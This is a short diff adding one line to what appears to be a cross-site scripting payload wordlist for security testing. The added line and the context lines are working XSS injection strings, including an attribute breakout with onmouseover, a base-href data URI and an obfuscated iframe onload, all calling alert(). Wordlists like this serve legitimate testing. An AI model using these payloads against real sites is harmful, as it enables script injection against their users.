@@ -2164,3 +2164,4 @@ http://www.<script>alert(1)</script .com
 '-confirm`1`-'
 <base href=data:/,alert(1)/><script src="jquery.js"></script>
 `<b\x20#x (click)="x.inn\x65rHTML='\x3ciframe onload=alert(1)\x3e'">CLICK</b>`
+" onmouseover="alert(4321)" blah="
